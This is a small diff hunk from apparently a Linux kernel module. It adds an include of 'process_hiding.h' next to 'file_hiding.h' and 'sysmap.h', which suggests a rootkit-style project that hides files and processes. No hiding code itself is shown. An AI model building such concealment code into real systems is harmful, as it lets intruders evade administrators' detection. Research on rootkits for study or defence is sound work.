@@ -2,6 +2,7 @@
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
+#include "process_hiding.h"
 #include "file_hiding.h"
 #include "sysmap.h"
 
